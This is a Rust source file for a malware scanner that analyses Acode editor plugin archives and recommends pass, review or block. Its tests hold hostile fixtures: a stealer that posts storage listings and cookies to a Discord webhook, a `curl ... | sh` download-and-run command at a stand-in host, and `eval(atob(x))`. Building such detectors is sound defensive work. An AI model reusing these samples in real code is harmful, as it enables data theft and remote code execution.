use std::{collections::BTreeMap, path::Path};

use crate::{
    archive::{self, ArchiveError, Limits, PluginArchive},
    js, manifest,
    report::{Capability, Endpoint, Finding, Recommendation, Report},
    rules::{self, RuleContext},
    severity::{Category, Confidence, Severity},
};

/// Files above this are not parsed; real plugin bundles are far smaller.
const MAX_PARSE_BYTES: usize = 16 * 1024 * 1024;

#[derive(Debug, Clone, Copy, Default)]
pub struct ScanOptions {
    /// Only analyse the script Acode loads, not chunks or other JS files.
    pub entry_only: bool,
    pub limits: Limits,
}

pub fn scan_zip(path: &Path, options: ScanOptions) -> Result<Report, ArchiveError> {
    let mut report = Report::new();
    let archive = PluginArchive::read(path, options.limits, &mut report)?;
    scan_archive(&archive, options, &mut report);
    Ok(report)
}

pub fn scan_archive(archive: &PluginArchive, options: ScanOptions, report: &mut Report) {
    let manifest = manifest::load(archive, report);
    if let Some(manifest) = &manifest {
        report.plugin = Some(manifest.summary());
    }
    let plugin_id = manifest.as_ref().and_then(|manifest| manifest.id.clone());
    let entry = manifest
        .as_ref()
        .and_then(|manifest| manifest.entry.clone());

    let mut reads_sensitive = Vec::new();
    let mut url_sources: Vec<(String, String)> = Vec::new();

    for file in archive.javascript_files() {
        if options.entry_only && entry.as_deref() != Some(file.path.as_str()) {
            continue;
        }
        let name = if file.installed {
            file.path.clone()
        } else {
            format!("{} (overwritten entry `{}`)", file.path, file.raw_name)
        };

        if file.bytes.len() > MAX_PARSE_BYTES {
            report.push(
                Finding::new(
                    "js.too_large",
                    Severity::Medium,
                    Category::Obfuscation,
                    "JavaScript file is too large to analyse",
                    format!("{} bytes", file.bytes.len()),
                )
                .with_file(name.clone()),
            );
            report.mark_incomplete();
            continue;
        }

        let source = match std::str::from_utf8(&file.bytes) {
            Ok(source) => source.to_string(),
            Err(_) => {
                report.push(
                    Finding::new(
                        "js.invalid_utf8",
                        Severity::Medium,
                        Category::Obfuscation,
                        "JavaScript file isn't valid UTF-8; analysed with replacement characters",
                        "invalid UTF-8",
                    )
                    .with_file(name.clone()),
                );
                String::from_utf8_lossy(&file.bytes).into_owned()
            }
        };

        let source = if archive::file_kind(&file.path, &file.bytes) == "html" {
            let (js_view, remote_scripts) = js::html_scripts(&source);
            for src in remote_scripts {
                report.push(
                    Finding::new(
                        "dynamic.remote_script",
                        Severity::High,
                        Category::DynamicCode,
                        "HTML page loads a <script> from a remote URL",
                        src.clone(),
                    )
                    .with_file(name.clone())
                    .keyed(rules::host_of(&src).unwrap_or(src)),
                );
            }
            if js_view.trim().is_empty() {
                continue;
            }
            js_view
        } else {
            source
        };

        let mut ctx = RuleContext::new(&name, &source, plugin_id.as_deref());
        let outcome = js::analyze(&mut ctx);
        report.stats.js_files_parsed += 1;
        report.stats.js_bytes_parsed += source.len() as u64;
        if ctx.facts.minified {
            report.stats.minified_files += 1;
        }

        if outcome.panicked {
            ctx.push(ctx.finding(
                "js.parse_failed",
                Severity::Medium,
                Category::Obfuscation,
                None,
                "JavaScript could not be parsed, so it was only partly analysed",
                outcome.errors.first().cloned().unwrap_or_default(),
            ));
            report.mark_incomplete();
        }
        for error in &outcome.errors {
            report.error(Some(&name), format!("parse: {error}"));
        }

        let facts = std::mem::take(&mut ctx.facts);
        report.modules.required.extend(facts.required_modules);
        report.modules.defined.extend(facts.defined_modules);
        if facts.reads_sensitive_data || facts.listens_to_keys {
            reads_sensitive.push(name.clone());
        }
        url_sources.extend(facts.urls.into_iter().map(|url| (name.clone(), url)));
        report.findings.extend(ctx.findings);
        report.sources.insert(name, source);
    }

    analyse_endpoints(report, &url_sources);
    correlate(report, &reads_sensitive);

    report.files = archive.file_entries();
    report.aggregate_findings();
    report.capabilities = capabilities(report);
    decide(report);
    report.refresh_summary();
}

fn analyse_endpoints(report: &mut Report, urls: &[(String, String)]) {
    let mut endpoints: BTreeMap<String, Endpoint> = BTreeMap::new();
    for (file, url) in urls {
        let Some(host) = rules::host_of(url) else {
            continue;
        };
        if is_namespace_host(&host) {
            continue;
        }
        let risk = rules::classify_endpoint(url, &host);
        let endpoint = endpoints.entry(host.clone()).or_insert_with(|| Endpoint {
            host: host.clone(),
            count: 0,
            example: rules::shorten(url, 160),
            tags: Vec::new(),
        });
        endpoint.count += 1;
        if let Some(risk) = risk {
            if !endpoint.tags.contains(&risk.tag.to_string()) {
                endpoint.tags.push(risk.tag.to_string());
            }
            if let Some(severity) = risk.severity {
                report.push(
                    Finding::new(
                        "network.suspicious_endpoint",
                        severity,
                        Category::Network,
                        risk.message,
                        rules::shorten(url, 200),
                    )
                    .with_file(file.clone())
                    .keyed(&host),
                );
            }
        }
    }
    let mut endpoints: Vec<_> = endpoints.into_values().collect();
    // Flagged hosts first, then the most mentioned.
    endpoints.sort_by_key(|endpoint| {
        (
            endpoint.tags.is_empty(),
            std::cmp::Reverse(endpoint.count),
            endpoint.host.clone(),
        )
    });
    report.endpoints = endpoints;
}

/// XML/SVG namespace and schema URIs that are never fetched.
fn is_namespace_host(host: &str) -> bool {
    matches!(
        host,
        "www.w3.org" | "w3.org" | "json-schema.org" | "ns.adobe.com" | "purl.org"
    )
}

/// Combinations that mean more than their parts.
fn correlate(report: &mut Report, sensitive_files: &[String]) {
    let exfil_hosts: Vec<String> = report
        .findings
        .iter()
        .filter(|finding| {
            finding.id == "network.suspicious_endpoint" && finding.severity >= Severity::High
        })
        .map(|finding| {
            finding
                .key
                .trim_start_matches("network.suspicious_endpoint:")
                .to_string()
        })
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect();
    if !exfil_hosts.is_empty() && !sensitive_files.is_empty() {
        report.push(
            Finding::new(
                "correlation.exfiltration",
                Severity::Critical,
                Category::Network,
                "Reads user data (files, editor text, storage, clipboard, or keystrokes) and talks to a data-capture endpoint",
                format!("endpoints: {}; reads data in: {}", exfil_hosts.join(", "), sensitive_files.join(", ")),
            )
            .with_confidence(Confidence::Medium)
            .keyed(exfil_hosts.join(",")),
        );
    }
}

fn capabilities(report: &Report) -> Vec<Capability> {
    Category::ALL
        .iter()
        .filter_map(|category| {
            let findings: Vec<&Finding> = report
                .findings
                .iter()
                .filter(|finding| finding.category == *category)
                .collect();
            let severity = findings.iter().map(|finding| finding.severity).max()?;
            let mut rules: Vec<String> =
                findings.iter().map(|finding| finding.id.clone()).collect();
            rules.dedup();
            let mut evidence: Vec<String> = Vec::new();
            for finding in &findings {
                let item = match finding.key.split_once(':') {
                    Some((_, detail)) => detail.to_string(),
                    None => finding.evidence.clone(),
                };
                if !evidence.contains(&item) && evidence.len() < 10 {
                    evidence.push(item);
                }
            }
            Some(Capability {
                category: *category,
                title: category.title().to_string(),
                description: category.description().to_string(),
                severity,
                rules,
                evidence,
            })
        })
        .collect()
}

fn decide(report: &mut Report) {
    let block = report.findings.iter().any(|finding| {
        finding.severity == Severity::Critical && finding.confidence >= Confidence::Medium
    });
    let review = report
        .findings
        .iter()
        .any(|finding| finding.severity >= Severity::High);

    let verdict = &mut report.verdict;
    verdict.risk = report.findings.iter().map(|finding| finding.severity).max();
    verdict.recommendation = if block {
        Recommendation::Block
    } else if review || !verdict.complete {
        Recommendation::Review
    } else {
        Recommendation::Pass
    };

    // One line per rule, listing what it matched.
    let mut grouped: Vec<(&Finding, Vec<String>)> = Vec::new();
    for finding in report
        .findings
        .iter()
        .filter(|finding| finding.severity >= Severity::High)
    {
        let detail = finding
            .key
            .split_once(':')
            .map(|(_, detail)| detail.to_string())
            .unwrap_or_else(|| rules::shorten(&finding.evidence, 80));
        match grouped.iter_mut().find(|(first, _)| first.id == finding.id) {
            Some((_, details)) if !details.contains(&detail) => details.push(detail),
            Some(_) => {}
            None => grouped.push((finding, vec![detail])),
        }
    }
    verdict.reasons = grouped
        .into_iter()
        .take(8)
        .map(|(finding, details)| {
            format!(
                "{}: {} [{}: {}]",
                finding.severity.label(),
                finding.message,
                finding.id,
                rules::shorten(&details.join(", "), 120)
            )
        })
        .collect();
    if !verdict.complete {
        verdict
            .reasons
            .push("Scan incomplete: some files hit limits or could not be read".to_string());
    }
}

#[cfg(test)]
mod tests {
    use std::io::Write;

    use zip::{ZipWriter, write::SimpleFileOptions};

    use super::*;

    pub fn make_zip(path: &Path, files: &[(&str, &[u8])]) {
        let mut zip = ZipWriter::new(std::fs::File::create(path).unwrap());
        for (name, bytes) in files {
            zip.start_file(*name, SimpleFileOptions::default()).unwrap();
            zip.write_all(bytes).unwrap();
        }
        zip.finish().unwrap();
    }

    fn scan(files: &[(&str, &[u8])]) -> Report {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("plugin.zip");
        make_zip(&path, files);
        scan_zip(&path, ScanOptions::default()).unwrap()
    }

    const MANIFEST: (&str, &[u8]) = (
        "plugin.json",
        br#"{"id":"com.example.p","name":"P","main":"main.js","version":"1.0.0"}"#,
    );
    const ICON: (&str, &[u8]) = ("icon.png", b"\x89PNG");
    const README: (&str, &[u8]) = ("readme.md", b"# P");

    #[test]
    fn typical_editor_plugin_passes() {
        let report = scan(&[
            MANIFEST,
            ICON,
            README,
            (
                "main.js",
                br#"
                const fs = acode.require('fs');
                const toast = acode.require('toast');
                class P {
                  async init() {
                    const text = await fs(this.baseUrl + 'data.json').readFile('utf8');
                    localStorage.setItem('p', text);
                    const res = await fetch('https://api.github.com/repos/x/y');
                    editorManager.editor.commands.addCommand({ name: 'x', exec() {} });
                    document.addEventListener('keydown', () => {});
                  }
                }
                acode.setPluginInit('com.example.p', (base) => new P().init());
                "#,
            ),
        ]);
        assert_eq!(
            report.verdict.recommendation,
            Recommendation::Pass,
            "{:#?}",
            report.findings
        );
        assert!(
            report
                .endpoints
                .iter()
                .any(|endpoint| endpoint.host == "api.github.com")
        );
    }

    #[test]
    fn webpack_chunked_bundle_passes() {
        let report = scan(&[
            MANIFEST,
            ICON,
            README,
            (
                "main.js",
                br#"(()=>{var e={},t=Function("return this")();
                __webpack_require__.l=(r,n)=>{var o=document.createElement("script");o.src=r;document.head.appendChild(o)};
                acode.setPluginInit("com.example.p",()=>{})})();"#,
            ),
            ("123.main.js", b"(self.webpackChunk=self.webpackChunk||[]).push([[123],{}]);"),
        ]);
        assert_eq!(
            report.verdict.recommendation,
            Recommendation::Pass,
            "{:#?}",
            report.findings
        );
        assert_eq!(report.stats.js_files_parsed, 2);
    }

    #[test]
    fn terminal_plugin_needs_review_but_not_block() {
        let report = scan(&[
            MANIFEST,
            ICON,
            README,
            (
                "main.js",
                b"Executor.execute('apk add python3'); acode.require('terminal');",
            ),
        ]);
        assert_eq!(report.verdict.recommendation, Recommendation::Review);
    }

    #[test]
    fn stealer_is_blocked() {
        let report = scan(&[
            MANIFEST,
            ICON,
            README,
            (
                "main.js",
                br#"
                const fs = acode.require('fs');
                acode.setPluginInit('com.example.p', async () => {
                  const files = await fs(DATA_STORAGE).lsDir();
                  const body = JSON.stringify({ files, cookie: document.cookie });
                  fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body });
                });
                "#,
            ),
        ]);
        assert_eq!(
            report.verdict.recommendation,
            Recommendation::Block,
            "{:#?}",
            report.findings
        );
        assert!(report.has("correlation.exfiltration"));
    }

    #[test]
    fn code_hidden_behind_duplicate_entry_is_scanned() {
        let report = scan(&[
            MANIFEST,
            ICON,
            README,
            ("main.js", b"acode.setPluginInit('com.example.p', () => {})"),
            (
                "./main.js",
                b"Executor.execute('curl https://e.vil/x | sh')",
            ),
        ]);
        assert!(report.has("archive.install_path_collision"));
        assert!(report.has("shell.dangerous_command"));
        assert_eq!(report.verdict.recommendation, Recommendation::Block);
    }

    #[test]
    fn entry_only_mode_skips_other_files() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("plugin.zip");
        make_zip(
            &path,
            &[
                MANIFEST,
                ICON,
                README,
                ("main.js", b""),
                ("other.js", b"eval(atob(x))"),
            ],
        );
        let report = scan_zip(
            &path,
            ScanOptions {
                entry_only: true,
                ..ScanOptions::default()
            },
        )
        .unwrap();
        assert_eq!(report.stats.js_files_parsed, 1);
        assert!(!report.has("dynamic.decoded_exec"));
    }

    #[test]
    fn unreadable_zip_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.zip");
        std::fs::write(&path, b"not a zip").unwrap();
        assert!(scan_zip(&path, ScanOptions::default()).is_err());
    }
}
